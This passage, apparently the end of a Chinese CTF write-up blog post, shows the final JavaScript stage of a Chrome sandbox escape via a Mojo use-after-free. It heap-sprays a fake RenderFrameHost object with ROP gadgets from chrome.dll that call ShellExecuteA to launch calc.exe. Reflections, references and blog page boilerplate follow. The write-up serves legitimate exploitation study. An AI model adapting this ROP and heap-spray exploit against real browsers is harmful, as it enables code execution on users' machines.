+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//释放blob，重新heap spray</span><br><span class="line">await allocation.free();</span><br><span class="line">console.log(&quot;rfh_addr=0x&quot; + rfh_addr.toString(16));</span><br><span class="line">//0x00000001814fbfae : xchg rax, rsp ; ret</span><br><span class="line">var xchg_rax_rsp = chrome_dll_base + 0x14fbfaen;</span><br><span class="line">//0x00000001850caadf : mov rax, qword ptr [rcx + 0x10] ; add rcx, 0x10 ; call qword ptr [rax + 0x158]</span><br><span class="line">var adjust_register = chrome_dll_base + 0x50caadfn;</span><br><span class="line">//0x0000000184ebc82f : add rsp, 0x158 ; ret</span><br><span class="line">var add_rsp_158 = chrome_dll_base + 0x4ebc82fn;</span><br><span class="line">var shellExecuteA = chrome_dll_base + 0x3FA9C0Fn;</span><br><span class="line">var pop_rsi = chrome_dll_base + 0x13b8n;</span><br><span class="line">fakeRFH.fill(0n);</span><br><span class="line">//fake</span><br><span class="line">fakeRFH[0] = rfh_addr;</span><br><span class="line">fakeRFH[0x10 / 0x8] = rfh_addr + 0x18n;</span><br><span class="line">fakeRFH[0x18 / 0x8] = add_rsp_158;</span><br><span class="line"></span><br><span class="line">fakeRFH[0xc8 / 0x8] = adjust_register;</span><br><span class="line">fakeRFH[0x170 / 0x8] = xchg_rax_rsp;</span><br><span class="line"></span><br><span class="line">//now rop</span><br><span class="line">fakeRFH[0x178 / 0x8] = pop_rsi;</span><br><span class="line">fakeRFH[0x180 / 0x8] = rfh_addr + 0x1c0n;</span><br><span class="line">fakeRFH[0x188 / 0x8] = shellExecuteA;</span><br><span class="line">fakeRFH[0x1b0 / 0x8] = 0n;</span><br><span class="line">fakeRFH[0x1b8 / 0x8] = 0x3n;</span><br><span class="line"></span><br><span class="line">//cmd</span><br><span class="line">var cmd = &quot;calc.exe\x00&quot;;</span><br><span class="line">var cmd_buf = new Uint8Array(fakeRFH.buffer);</span><br><span class="line">for (var i=0;i&lt;cmd.length;i++) &#123;</span><br><span class="line">   cmd_buf[0x1c0 + i] = cmd.charCodeAt(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//heap spray</span><br><span class="line">for (var i=0;i&lt;spray_count;i++) &#123;</span><br><span class="line">   await allocate(fakeRFH.buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//run</span><br><span class="line">await antNestPtr.store(&quot;&quot;);</span><br></pre></td></tr></table></figure>
+<p>效果如下<br><img src="https://p2.ssl.qhimg.com/t018551319636bf1e64.png"></p>
+<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>Chrome沙箱逃逸这一块做起来还是不错的，也没那么难。通过学习，收获了许多。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dangwei_90/article/details/110407234">chromium 之 ipc (mojo) 消息机制</a><br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md">Mojo docs (go&#x2F;mojo-docs)</a><br><a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Pwn/EasyMojo">SCTF2020-EasyMojo</a><br><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/vD2V">利用 Mojo IPC 的 UAF 漏洞逃逸 Chrome 浏览器沙箱</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Gfo3GAoSyK50jFqOKCHKVA">90分钟加时依然无解 | AntCTF x D^3CTF [EasyChromeFullChain] Writeup</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="tag"># Chrome沙箱逃逸</a>
+              <a href="/ha1vk/tags/heap-spray/" rel="tag"># heap spray</a>
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/05/06/virtualbox-SharedOpenGL/" rel="prev" title="VirtualBox虚拟机逃逸之SharedOpenGL模块">
+      <i class="fa fa-chevron-left"></i> VirtualBox虚拟机逃逸之SharedOpenGL模块
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/05/28/llvm-pass-pwn/" rel="next" title="LLVM PASS PWN">
+      LLVM PASS PWN <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mojo"><span class="nav-number">2.1.</span> <span class="nav-text">Mojo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-V8-RCE%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">0x02 V8 RCE部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OOB%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0"><span class="nav-number">3.2.</span> <span class="nav-text">OOB数组构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="nav-number">3.3.</span> <span class="nav-text">地址泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8Mojo%E9%83%A8%E5%88%86"><span class="nav-number">4.</span> <span class="nav-text">0x03 沙箱逃逸Mojo部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%90%AFMojo%E5%8A%9F%E8%83%BD"><span class="nav-number">4.2.</span> <span class="nav-text">开启Mojo功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2RenderFrameImpl%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-number">4.3.</span> <span class="nav-text">泄露RenderFrameImpl对象地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">4.4.</span> <span class="nav-text">ROP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
